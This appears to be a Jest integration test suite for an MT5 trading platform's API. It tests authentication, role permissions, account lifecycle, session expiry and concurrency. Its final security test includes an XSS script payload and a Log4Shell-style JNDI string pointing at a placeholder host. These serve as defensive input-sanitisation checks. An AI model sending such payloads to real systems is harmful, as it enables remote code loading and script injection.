const request = require('supertest');

// Import setup FIRST - this sets up the Redis mock
require('./setup');

// Import app AFTER setup
const app = require('../server');

describe('MT5 Trading Platform - Integration Tests', () => {
  let redisClient;
  let adminUser, managerUser, traderUser;
  let adminToken, managerToken, traderToken;
  let testAccount;

  beforeAll(async () => {
    // Get Redis client for manual operations
    redisClient = testHelpers.getRedisClient();
    
    // Wait for app to initialize
    await testHelpers.wait(500);
  });

  beforeEach(async () => {
    // Clear Redis data before each test to ensure isolation
    await testHelpers.clearRedisData(redisClient);
  });

  afterAll(async () => {
    // Clean up Redis connection
    if (redisClient && redisClient.quit) {
      await redisClient.quit();
    }
  });

  describe('Complete User Workflow', () => {
    test('Should complete full user registration and login workflow', async () => {
      // 1. Register a new user
      const userData = testHelpers.generateTestUser({
        username: 'integration_user',
        email: 'integration@test.com'
      });

      const registerResponse = await request(app)
        .post('/api/auth/register')
        .send(userData)
        .expect(201);

      expect(registerResponse.body).toHaveProperty('user');
      expect(registerResponse.body).toHaveProperty('session_id');
      expect(registerResponse.body.user).toHaveValidUserStructure();

      const sessionId = registerResponse.body.session_id;

      // 2. Verify session works
      const verifyResponse = await request(app)
        .get('/api/auth/verify')
        .set('Authorization', `Bearer ${sessionId}`)
        .expect(200);

      expect(verifyResponse.body.user.username).toBe(userData.username);

      // 3. Logout
      await request(app)
        .post('/api/auth/logout')
        .set('Authorization', `Bearer ${sessionId}`)
        .expect(200);

      // 4. Verify session is invalidated
      await request(app)
        .get('/api/auth/verify')
        .set('Authorization', `Bearer ${sessionId}`)
        .expect(401);

      // 5. Login with same credentials
      const loginResponse = await request(app)
        .post('/api/auth/login')
        .send({
          username: userData.username,
          password: userData.password
        })
        .expect(200);

      expect(loginResponse.body).toHaveProperty('user');
      expect(loginResponse.body).toHaveProperty('session_id');
      expect(loginResponse.body.user.username).toBe(userData.username);
    });
  });

  describe('Role-Based Access Control Workflow', () => {
    beforeEach(async () => {
      // Create users with different roles for testing
      const { user: admin, token: aToken } = await testHelpers.createAuthenticatedUser(app, 'admin', redisClient);
      const { user: manager, token: mToken } = await testHelpers.createAuthenticatedUser(app, 'manager', redisClient);
      const { user: trader, token: tToken } = await testHelpers.createAuthenticatedUser(app, 'trader', redisClient);

      adminUser = admin;
      adminToken = aToken;
      managerUser = manager;
      managerToken = mToken;
      traderUser = trader;
      traderToken = tToken;
    });

    test('Admin should access all user management endpoints', async () => {
      // Get all users
      const usersResponse = await request(app)
        .get('/api/users')
        .set('Authorization', `Bearer ${adminToken}`)
        .expect(200);

      expect(Array.isArray(usersResponse.body)).toBe(true);
      expect(usersResponse.body.length).toBeGreaterThan(0);

      // Create a new user
      const newUserData = testHelpers.generateTestUser({
        username: 'admin_created_user',
        role: 'viewer',
        password: 'password123'
      });

      const createResponse = await request(app)
        .post('/api/users')
        .set('Authorization', `Bearer ${adminToken}`)
        .send(newUserData)
        .expect(201);

      expect(createResponse.body.user).toHaveValidUserStructure();
      expect(createResponse.body.user.role).toBe('viewer');

      const createdUserId = createResponse.body.user.id;

      // Update the user
      const updateResponse = await request(app)
        .put(`/api/users/${createdUserId}`)
        .set('Authorization', `Bearer ${adminToken}`)
        .send({ role: 'trader' })
        .expect(200);

      expect(updateResponse.body.user.role).toBe('trader');

      // Delete the user
      await request(app)
        .delete(`/api/users/${createdUserId}`)
        .set('Authorization', `Bearer ${adminToken}`)
        .expect(200);
    });

    test('Manager should access account management but not user management', async () => {
      // Should be able to access accounts
      await request(app)
        .get('/api/accounts')
        .set('Authorization', `Bearer ${managerToken}`)
        .expect(200);

      // Should be able to create accounts
      const accountData = testHelpers.generateTestAccount();
      const createResponse = await request(app)
        .post('/api/accounts')
        .set('Authorization', `Bearer ${managerToken}`)
        .send(accountData)
        .expect(201);

      expect(createResponse.body.account).toHaveValidAccountStructure();
      testAccount = createResponse.body.account;

      // Should NOT be able to access user management
      await request(app)
        .get('/api/users')
        .set('Authorization', `Bearer ${managerToken}`)
        .expect(403);
    });

    test('Trader should have read-only access to accounts', async () => {
      // Should be able to view accounts
      await request(app)
        .get('/api/accounts')
        .set('Authorization', `Bearer ${traderToken}`)
        .expect(200);

      // Should NOT be able to create accounts
      const accountData = testHelpers.generateTestAccount();
      await request(app)
        .post('/api/accounts')
        .set('Authorization', `Bearer ${traderToken}`)
        .send(accountData)
        .expect(403);

      // Should NOT be able to access user management
      await request(app)
        .get('/api/users')
        .set('Authorization', `Bearer ${traderToken}`)
        .expect(403);
    });
  });

  describe('Account Management Workflow', () => {
    beforeEach(async () => {
      // Create manager for account tests
      const { token } = await testHelpers.createAuthenticatedUser(app, 'manager', redisClient);
      managerToken = token;
    });

    test('Should complete full account lifecycle', async () => {
      const accountData = testHelpers.generateTestAccount({
        account_number: '99999999',
        account_type: 'FTMO'
      });

      // 1. Create account
      const createResponse = await request(app)
        .post('/api/accounts')
        .set('Authorization', `Bearer ${managerToken}`)
        .send(accountData)
        .expect(201);

      expect(createResponse.body.account).toHaveValidAccountStructure();
      expect(createResponse.body.account.account_type).toBe('FTMO');
      expect(createResponse.body.account.status).toBe('inactive');

      const accountId = createResponse.body.account.id;

      // 2. Update account
      const updateData = {
        server: 'UpdatedServer-MT5',
        account_type: 'Forex'
      };

      const updateResponse = await request(app)
        .put(`/api/accounts/${accountId}`)
        .set('Authorization', `Bearer ${managerToken}`)
        .send(updateData)
        .expect(200);

      expect(updateResponse.body.account.server).toBe('UpdatedServer-MT5');
      expect(updateResponse.body.account.account_type).toBe('Forex');

      // 3. Verify account appears in list
      const listResponse = await request(app)
        .get('/api/accounts')
        .set('Authorization', `Bearer ${managerToken}`)
        .expect(200);

      const foundAccount = listResponse.body.find(acc => acc.id === accountId);
      expect(foundAccount).toBeDefined();
      expect(foundAccount.server).toBe('UpdatedServer-MT5');

      // 4. Delete account
      await request(app)
        .delete(`/api/accounts/${accountId}`)
        .set('Authorization', `Bearer ${managerToken}`)
        .expect(200);

      // 5. Verify account is removed
      const listAfterDelete = await request(app)
        .get('/api/accounts')
        .set('Authorization', `Bearer ${managerToken}`)
        .expect(200);

      const deletedAccount = listAfterDelete.body.find(acc => acc.id === accountId);
      expect(deletedAccount).toBeUndefined();
    });
  });

  describe('Data Persistence and Consistency', () => {
    beforeEach(async () => {
      // Create manager for account tests
      const { token } = await testHelpers.createAuthenticatedUser(app, 'manager', redisClient);
      managerToken = token;
    });

    test('Should maintain data consistency across operations', async () => {
      // Create multiple accounts
      const accounts = testHelpers.createTestAccounts(3);
      const createdAccounts = [];

      for (const accountData of accounts) {
        const response = await request(app)
          .post('/api/accounts')
          .set('Authorization', `Bearer ${managerToken}`)
          .send(accountData)
          .expect(201);

        createdAccounts.push(response.body.account);
      }

      // Verify all accounts exist
      const listResponse = await request(app)
        .get('/api/accounts')
        .set('Authorization', `Bearer ${managerToken}`)
        .expect(200);

      expect(listResponse.body.length).toBeGreaterThanOrEqual(3);

      createdAccounts.forEach(account => {
        const found = listResponse.body.find(acc => acc.id === account.id);
        expect(found).toBeDefined();
        expect(found.account_number).toBe(account.account_number);
      });

      // Update one account and verify others remain unchanged
      const accountToUpdate = createdAccounts[0];
      const updateResponse = await request(app)
        .put(`/api/accounts/${accountToUpdate.id}`)
        .set('Authorization', `Bearer ${managerToken}`)
        .send({ server: 'NewServer-MT5' })
        .expect(200);

      expect(updateResponse.body.account.server).toBe('NewServer-MT5');

      // Verify other accounts unchanged
      const listAfterUpdate = await request(app)
        .get('/api/accounts')
        .set('Authorization', `Bearer ${managerToken}`)
        .expect(200);

      const otherAccounts = createdAccounts.slice(1);
      otherAccounts.forEach(account => {
        const found = listAfterUpdate.body.find(acc => acc.id === account.id);
        expect(found.server).toBe(account.server); // Should be unchanged
      });

      // Clean up
      for (const account of createdAccounts) {
        await request(app)
          .delete(`/api/accounts/${account.id}`)
          .set('Authorization', `Bearer ${managerToken}`);
      }
    });
  });

  describe('Error Handling and Edge Cases', () => {
    beforeEach(async () => {
      // Create manager for account tests
      const { token } = await testHelpers.createAuthenticatedUser(app, 'manager', redisClient);
      managerToken = token;
    });

    test('Should handle duplicate account numbers gracefully', async () => {
      const accountData = testHelpers.generateTestAccount({
        account_number: '11111111'
      });

      // Create first account
      const firstResponse = await request(app)
        .post('/api/accounts')
        .set('Authorization', `Bearer ${managerToken}`)
        .send(accountData)
        .expect(201);

      // Try to create duplicate
      await request(app)
        .post('/api/accounts')
        .set('Authorization', `Bearer ${managerToken}`)
        .send(accountData)
        .expect(400);

      // Clean up
      await request(app)
        .delete(`/api/accounts/${firstResponse.body.account.id}`)
        .set('Authorization', `Bearer ${managerToken}`);
    });

    test('Should handle session expiration correctly', async () => {
      // Create a session and manually expire it
      const { v4: uuidv4 } = require('uuid');

      const expiredSessionId = uuidv4();
      const expiredSessionData = {
        user_id: 'test-user-id',
        username: 'test-user',
        role: 'trader',
        created_at: new Date(Date.now() - 25 * 60 * 60 * 1000).toISOString(),
        expires_at: new Date(Date.now() - 1 * 60 * 60 * 1000).toISOString() // Expired 1 hour ago
      };

      await redisClient.setEx(`session:${expiredSessionId}`, 1, JSON.stringify(expiredSessionData));

      // Try to use expired session
      await request(app)
        .get('/api/accounts')
        .set('Authorization', `Bearer ${expiredSessionId}`)
        .expect(401);
    });

    test('Should handle malformed requests', async () => {
      // Malformed JSON
      await request(app)
        .post('/api/auth/login')
        .set('Content-Type', 'application/json')
        .send('{"malformed": json}')
        .expect(400);

      // Missing required fields
      await request(app)
        .post('/api/auth/register')
        .send({ username: 'incomplete' })
        .expect(400);

      // Invalid UUIDs in manager context
      if (managerToken) {
        await request(app)
          .get('/api/accounts/invalid-uuid')
          .set('Authorization', `Bearer ${managerToken}`)
          .expect(404);
      }
    });
  });

  describe('Performance and Concurrency', () => {
    beforeEach(async () => {
      // Create manager for account tests
      const { token } = await testHelpers.createAuthenticatedUser(app, 'manager', redisClient);
      managerToken = token;
    });

    test('Should handle concurrent requests without data corruption', async () => {
      const promises = [];
      const numRequests = 10;

      // Create multiple accounts concurrently
      for (let i = 0; i < numRequests; i++) {
        const accountData = testHelpers.generateTestAccount({
          account_number: `concurrent_${i}_${Date.now()}`
        });

        promises.push(
          request(app)
            .post('/api/accounts')
            .set('Authorization', `Bearer ${managerToken}`)
            .send(accountData)
        );
      }

      const responses = await Promise.all(promises);

      // Verify all requests succeeded or failed gracefully
      responses.forEach(response => {
        expect([201, 400, 409]).toContain(response.status);
      });

      // Count successful creations
      const successfulCreations = responses.filter(r => r.status === 201);
      expect(successfulCreations.length).toBeGreaterThan(0);

      // Verify data integrity
      const listResponse = await request(app)
        .get('/api/accounts')
        .set('Authorization', `Bearer ${managerToken}`)
        .expect(200);

      successfulCreations.forEach(response => {
        const account = response.body.account;
        const found = listResponse.body.find(acc => acc.id === account.id);
        expect(found).toBeDefined();
      });

      // Clean up created accounts
      for (const response of successfulCreations) {
        await request(app)
          .delete(`/api/accounts/${response.body.account.id}`)
          .set('Authorization', `Bearer ${managerToken}`);
      }
    });
  });

  describe('Security Tests', () => {
    beforeEach(async () => {
      // Create trader for security tests
      const { token } = await testHelpers.createAuthenticatedUser(app, 'trader', redisClient);
      traderToken = token;
    });

    test('Should prevent unauthorized access to sensitive endpoints', async () => {
      // Try to access admin endpoints without token
      await request(app)
        .get('/api/users')
        .expect(401);

      // Try to access admin endpoints with invalid token
      await request(app)
        .get('/api/users')
        .set('Authorization', 'Bearer invalid-token')
        .expect(401);

      // Try to access admin endpoints with trader token
      await request(app)
        .get('/api/users')
        .set('Authorization', `Bearer ${traderToken}`)
        .expect(403);
    });

    test('Should sanitize and validate input data', async () => {
      const maliciousData = {
        username: '<script>alert("xss")</script>',
        email: 'test@example.com',
        password: 'password123',
        firstName: '${jndi:ldap://malicious.com}',
        lastName: 'User'
      };

      // Should not crash the server
      const response = await request(app)
        .post('/api/auth/register')
        .send(maliciousData);

      expect(response.status).toBeLessThan(500);
    });
  });
});